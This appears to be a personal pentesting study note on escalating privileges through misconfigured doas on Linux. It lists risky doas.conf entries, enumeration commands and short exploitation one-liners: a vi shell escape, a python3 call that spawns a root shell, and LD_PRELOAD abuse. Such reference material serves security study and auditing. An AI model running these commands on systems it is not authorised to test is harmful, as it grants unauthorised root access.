---
aliases:
tags:
  - estado/completo
  - env/linux
  - technique/privilege-escalation
  - tool/doas
kind: Technique
linked:
  - "[[Linux PrivEsc - Abusing Sudoers]]"
---
# doas

> [!info]
> Reemplazo de sudo simpler/security-focused de OpenBSD. También presente en Alpine, Arch, *BSD. Si configurado mal — privesc igual que sudo.

***

## Config file

`/etc/doas.conf`

Sintaxis:
```
permit <user> as <target-user>
permit nopass <user> as root cmd <cmd>
permit keepenv <user> as root
```

Análogo a sudoers pero parser distinto.

***

## Common misconfigs

| Misconfig | Vector |
|---|---|
| `permit nopass <user> as root` | Cualquier comando sin pwd |
| `permit nopass <user> as root cmd /bin/cat args /etc/passwd` | Cat root files → si user tiene write → arbitrary cmd via /etc/passwd swap |
| `permit keepenv` | LD_PRELOAD abuse igual que sudo |
| Wildcard en cmd | Igual sudoers `*` |

***

## Enum

```bash
# Listar permisos
doas -L 2>/dev/null

# Read config (usualmente readable)
cat /etc/doas.conf

# Test acceso
doas -u root id   # ¿prompt pwd o passa?
```

***

## Explotación común

```bash
# Si permite cmd con shell escape (vi, less, find, etc.)
doas vi /etc/anything
# Within vi: :!/bin/sh

# Si permite python/perl/ruby como root
doas python3 -c 'import os; os.execl("/bin/sh","sh")'

# LD_PRELOAD si keepenv
LD_PRELOAD=/tmp/evil.so doas ls
```

Misma lista GTFOBins aplica.

***

## Notas Relacionadas

- [[Linux PrivEsc - Abusing Sudoers]]
- [[Linux Privilege Escalation]]
